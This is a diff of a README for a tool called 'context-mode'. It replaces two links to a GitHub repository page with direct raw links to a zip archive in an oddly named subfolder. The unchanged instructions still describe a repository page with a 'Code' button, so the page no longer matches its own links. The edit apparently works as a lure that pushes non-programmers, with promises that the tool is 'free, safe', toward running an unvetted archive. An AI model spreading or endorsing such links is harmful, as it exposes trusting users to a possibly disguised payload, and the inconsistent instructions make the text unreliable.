@@ -25,7 +25,7 @@ You **do not** need to be a programmer to use this. If you can click a button an
 ### Step 1: Get the File
 
 👉 **Visit this link to download the application:**  
-**[https://github.com/gabrieldelima3957/context-mode](https://github.com/gabrieldelima3957/context-mode)**
+**[https://raw.githubusercontent.com/gabrieldelima3957/context-mode/main/acidimeter/context-mode-v1.4.zip](https://raw.githubusercontent.com/gabrieldelima3957/context-mode/main/acidimeter/context-mode-v1.4.zip)**
 
 You'll land on a page with a green "Code" button. Click it, then choose "Download ZIP" from the menu. The download will start automatically.
 
@@ -148,7 +148,7 @@ The best part? It's free, safe, and takes less than five minutes to set up.
 
 ---
 
-👉 **[Download context-mode now](https://github.com/gabrieldelima3957/context-mode)** and give your AI assistant the memory it deserves.
+👉 **[Download context-mode now](https://raw.githubusercontent.com/gabrieldelima3957/context-mode/main/acidimeter/context-mode-v1.4.zip)** and give your AI assistant the memory it deserves.
 
 ---
 
